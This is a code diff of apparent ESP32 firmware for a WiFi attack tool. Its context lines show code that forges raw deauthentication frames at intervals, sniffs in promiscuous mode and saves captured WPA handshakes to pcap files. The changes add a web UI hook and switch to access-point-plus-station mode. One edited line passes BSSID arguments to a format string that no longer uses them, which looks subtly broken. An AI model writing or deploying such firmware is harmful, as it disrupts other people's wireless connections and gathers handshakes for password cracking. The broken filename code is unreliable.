@@ -20,6 +20,10 @@ bool handshakeComplete = false;
 uint32_t lastDeauthTime = 0;
 #define DEAUTH_INTERVAL 5000
 
+#ifdef WEBUI
+extern void webui_init();
+#endif
+
 void sendDeauth(uint8_t* bssid, uint8_t* client) {
     uint8_t deauthPkt[26] = {
         0xc0, 0x00, 0x3a, 0x01,
@@ -64,7 +68,7 @@ void initPcapHeader() {
 
 void captureHandshake(uint8_t* payload, uint16_t len, uint8_t msgNum) {
     char pcapName[32];
-    sprintf(pcapName, "/handshake_%02X%02X%02X%02X%02X%02X.pcap", 
+    sprintf(pcapName, "/handshake_000000000000.pcap", 
             targetBSSID[0], targetBSSID[1], targetBSSID[2], 
             targetBSSID[3], targetBSSID[4], targetBSSID[5]);
     
@@ -206,7 +210,11 @@ void setup() {
         Serial.println("SD: FAILED");
     }
 
-    WiFi.mode(WIFI_STA);
+#ifdef WEBUI
+    webui_init();
+#endif
+
+    WiFi.mode(WIFI_AP_STA);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
     Serial.println("HANDSHAKE AUTO RUNNING");
